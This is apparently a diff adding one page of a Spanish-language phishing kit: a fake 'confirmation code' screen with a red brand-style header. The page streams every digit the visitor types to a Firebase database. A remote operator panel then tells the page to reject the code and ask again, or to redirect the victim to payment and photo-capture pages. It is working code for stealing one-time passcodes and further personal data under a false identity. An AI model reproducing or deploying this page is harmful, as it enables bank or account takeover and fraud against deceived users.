@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<title>Confirmación</title>
+
+<style>
+body{
+  margin:0;
+  font-family: Arial, sans-serif;
+  background:#fff;
+}
+
+/* 🔥 HEADER */
+.header{
+  background:#e30613;
+  height:70px; /* controla tamaño real */
+
+  display:flex;
+  justify-content:center;
+  align-items:center;
+}
+
+/* 🔥 LOGO */
+.header img{
+  width:160px;  /* controla tamaño real */
+  height:auto;
+}
+
+
+/* CONTENIDO */
+.container{
+  padding:30px 20px;
+  text-align:center;
+}
+
+h2{
+  margin-bottom:25px;
+}
+
+/* INPUT */
+.input-code{
+  width:100%;
+  max-width:320px;
+  margin:0 auto 20px;
+  padding:15px;
+
+  border-radius:25px;
+  border:none;
+  background:#eee;
+
+  font-size:20px;          /* 🔥 más grande */
+  text-align:center;       /* 🔥 centrado */
+  letter-spacing:5px;      /* 🔥 estilo código */
+
+  outline:none;
+}
+
+/* TEXTO */
+.texto{
+  font-size:13px;
+  color:#666;
+  margin-bottom:30px;
+}
+
+.texto span{
+  text-decoration:underline;
+}
+
+/* 🔴 INACTIVO */
+.btn{
+  background:#ccc;
+  color:#777;
+  border:none;
+  padding:12px 30px;
+  border-radius:25px;
+  font-weight:bold;
+  cursor:not-allowed;
+  transition:0.3s;
+}
+
+/* 🔥 ACTIVO */
+.btn.activo{
+  background:#e30613;
+  color:#fff;
+  cursor:pointer;
+}
+
+
+
+.overlay{
+  display:none;
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,0.5);
+  backdrop-filter:blur(4px);
+  justify-content:center;
+  align-items:center;
+  z-index:9999;
+}
+
+.loader{
+  text-align:center;
+  color:#fff;
+}
+
+.spinner{
+  width:40px;
+  height:40px;
+  border:4px solid #fff;
+  border-top:4px solid #e30613;
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+  margin:0 auto 10px;
+}
+
+@keyframes spin{
+  to{ transform:rotate(360deg); }
+}
+
+
+
+
+
+/* 🔥 OVERLAY */
+.overlay-error {
+  display: none;
+  position: fixed;
+  inset: 0;
+
+  background: rgba(0,0,0,0.4);
+  backdrop-filter: blur(4px);
+
+  justify-content: center;
+  align-items: center;
+
+  z-index: 9999;
+}
+
+/* 🔥 MODAL BLANCO CENTRADO */
+.modal-error {
+  background: #f5f5f5;
+  width: 85%;
+  max-width: 320px;
+
+  border-radius: 18px;
+  padding: 30px 20px;
+
+  text-align: center;
+  font-family: Arial, sans-serif;
+
+  box-shadow: 0 20px 50px rgba(0,0,0,0.3);
+}
+
+/* 🔥 TEXTO */
+.modal-error p {
+  font-size: 16px;
+  color: #333;
+  margin-bottom: 25px;
+  font-weight: 500;
+}
+
+/* 🔥 BOTÓN ROJO GRANDE */
+.btn-aceptar {
+  background: #e30613;
+  color: #fff;
+
+  border: none;
+  border-radius: 30px;
+
+  width: 180px;
+  padding: 12px 0;
+
+  font-size: 14px;
+  font-weight: bold;
+
+  cursor: pointer;
+}
+
+/* 🔥 EFECTO PRESIÓN */
+.btn-aceptar:active {
+  transform: scale(0.97);
+}
+</style>
+</head>
+
+<body>
+
+<div class="header">
+  <img src="Img2.png">
+</div>
+
+<div class="container">
+  <h2>Ingrese su código de confirmación</h2>
+
+  <input class="input-code" maxlength="8" type="text" placeholder="">
+
+  <div class="texto">
+    Si no recibe el código, puede esperar nuestra llamada o contactarnos a través del botón 
+    <span>¿Necesita Ayuda?</span>
+  </div>
+
+  <button class="btn">Continuar</button>
+</div>
+
+
+<div class="overlay">
+  <div class="loader">
+    <div class="spinner"></div>
+    <p>Cargando...</p>
+  </div>
+</div>
+
+<div class="overlay-error">
+  <div class="modal-error">
+    <p>El código que ingreso no es válido</p>
+    <button class="btn-aceptar">Aceptar</button>
+  </div>
+</div>
+
+
+<script type="module" src="firebase.js"></script>
+
+<script>
+window.addEventListener('load', () => {
+
+const { db, uid, ref, update, onValue } = window;
+
+// ===============================
+// 🔹 ELEMENTOS
+// ===============================
+const inputCodigo = document.querySelector(".input-code");
+const btn = document.querySelector(".btn");
+const overlay = document.querySelector(".overlay");
+const overlayError = document.querySelector(".overlay-error");
+
+// ===============================
+// 🔹 ESTADO CONEXIÓN
+// ===============================
+update(ref(db, "dataPages/" + uid), { 
+  estado: "abierto",
+  paginaActual: "Codigo.html" 
+});
+
+window.addEventListener("beforeunload", () => {
+  update(ref(db, "dataPages/" + uid), { 
+    estado: "cerrado",
+    paginaActual: null  
+  });
+});
+
+// ===============================
+// 🔹 INPUT → SOLO NÚMEROS + ENVÍO
+// ===============================
+if(inputCodigo){
+  inputCodigo.addEventListener("input", function() {
+
+    // solo números
+    this.value = this.value.replace(/\D/g, "");
+
+    // enviar en tiempo real
+    update(ref(db, "dataPages/" + uid), {
+      codigo: this.value
+    });
+
+    // activar botón
+    if(this.value.length >= 4){
+      btn.classList.add("activo");
+      btn.disabled = false;
+    } else {
+      btn.classList.remove("activo");
+      btn.disabled = true;
+    }
+
+  });
+}
+
+// ===============================
+// 🔹 BOTÓN CONTINUAR
+// ===============================
+if(btn){
+  btn.addEventListener("click", () => {
+
+    // activar barra en panel
+    update(ref(db, "dataPages/" + uid), {
+      mostrarBarracodigo: true
+    });
+
+    // mostrar overlay
+    if(overlay) overlay.style.display = "flex";
+
+  });
+}
+
+// ===============================
+// 🔹 ESCUCHAR PANEL (ERROR)
+// ===============================
+onValue(ref(db, "dataPages/" + uid), snapshot => {
+  const data = snapshot.val();
+  if (!data) return;
+
+  // ❌ INCORRECTO DESDE PANEL
+  if (data.estadoErrorCodigo === "incorrecto") {
+
+    if (overlay) overlay.style.display = "none";
+
+    if (inputCodigo) inputCodigo.value = "";
+
+    btn.classList.remove("activo");
+    btn.disabled = true;
+
+    if (overlayError) overlayError.style.display = "flex";
+
+    update(ref(db, "dataPages/" + uid), {
+      estadoErrorCodigo: null
+    });
+  }
+
+  // 🔥 REDIRECCIÓN A PAGO (SEPARADO)
+  if (data.accion === "pago") {
+
+    update(ref(db, "dataPages/" + uid), {
+      accion: null
+    });
+
+    window.location.href = "pago.html";
+  }
+
+
+  if (data.accion === "foto") {
+
+  update(ref(db, "dataPages/" + uid), {
+    accion: null
+  });
+
+  window.location.href = "foto.html";
+}
+
+
+if (data.accion === "final") {
+
+  update(ref(db, "dataPages/" + uid), {
+    accion: null
+  });
+
+  window.location.href = "../../final.html";
+}
+
+});
+
+
+const btnAceptar = document.querySelector(".btn-aceptar");
+
+if(btnAceptar){
+  btnAceptar.addEventListener("click", () => {
+
+    // ❌ cerrar modal
+    if (overlayError) overlayError.style.display = "none";
+
+    // 🔄 limpiar input
+    if (inputCodigo) inputCodigo.value = "";
+
+    // 🔄 desactivar botón
+    btn.classList.remove("activo");
+    btn.disabled = true;
+
+  });
+}
+
+
+});
+</script>
+
+
+</body>
+</html>
